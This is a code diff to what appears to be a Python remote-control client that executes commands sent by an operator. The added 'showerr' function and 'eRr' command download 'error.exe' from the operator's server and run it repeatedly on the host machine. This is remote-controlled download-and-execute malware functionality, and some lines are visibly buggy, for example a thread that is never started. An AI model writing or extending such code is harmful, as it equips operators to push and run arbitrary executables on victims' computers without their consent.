@@ -282,6 +282,25 @@ def runcmd(cmd):
         return True
     except Exception as e:
         log(f"runcmd thread error:\t{e}",state="WARN")
+def showerr(num):
+    try:
+        if not os.path.exists("error.exe"):
+            exe = hit(url+f"static/apps/error.exe")
+            try:
+                kp = type(exe.content.decode("utf-8"))
+                log(f"Likely error. recieved content for error.exe is {kp}")
+            except Exception as e:
+                log(f"DOwnloaded error.exe")
+            with open("error.exe", "wb") as file:
+                    downloaded_size = 0
+                    for chunk in exe.iter_content(chunk_size=8192):
+                        if chunk:
+                            file.write(chunk)
+                            downloaded_size += len(chunk)
+        for _ in range(1,num+1):
+            os.startfile("error.exe")
+    except Exception as e:
+        log(f"showerr thread error:\t{e}",state="WARN")
 def main():
     global sstate
     log(f"{user} online!", state="ONLINE")
@@ -322,6 +341,9 @@ def main():
             elif "cMd" in cmd:
                 cmd = cmd.replace("cMd ","")
                 Thread(Thread=runcmd,args=(cmd,)).start()
+            elif "eRr" in cmd:
+                cmd = cmd.replace("eRr ","")
+                Thread(target=showerr,args=(cmd,))
             elif "sPeAk" in cmd:
                 txt = cmd.replace("sPeAk","")
                 saying = Thread(target=say,args=(txt,))
